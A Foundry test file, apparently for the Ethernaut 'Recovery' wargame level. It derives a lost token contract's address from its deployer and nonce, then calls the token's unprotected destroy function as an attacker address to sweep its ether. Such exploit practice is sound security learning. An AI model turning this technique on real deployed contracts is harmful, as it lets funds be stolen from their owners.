// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Recovery.sol";
import {Test} from "forge-std/Test.sol";

contract RecoveryTest is Test {
    Recovery recovery;
    address payable attacker = payable(address(0xBEEF));

    function setUp() public {
        recovery = new Recovery();
        recovery.generateToken("LostToken", 1e18);
    }

    function testRecoveryExploit() public {
        // compute address of SimpleToken created by Recovery (nonce = 1)
        address tokenAddress = address(uint160(uint(
            keccak256(abi.encodePacked(
                bytes1(0xd6),
                bytes1(0x94),
                address(recovery),
                bytes1(0x01)
            ))
        )));

        SimpleToken token = SimpleToken(payable(tokenAddress));

        vm.startPrank(attacker);
        token.destroy(attacker);
        vm.stopPrank();

        assertEq(attacker.balance, 0); // no ETH yet

        // send ETH to token, then destroy again
        vm.deal(tokenAddress, 1 ether);

        vm.startPrank(attacker);
        token.destroy(attacker);
        vm.stopPrank();

        assertEq(attacker.balance, 1 ether);
    }
}
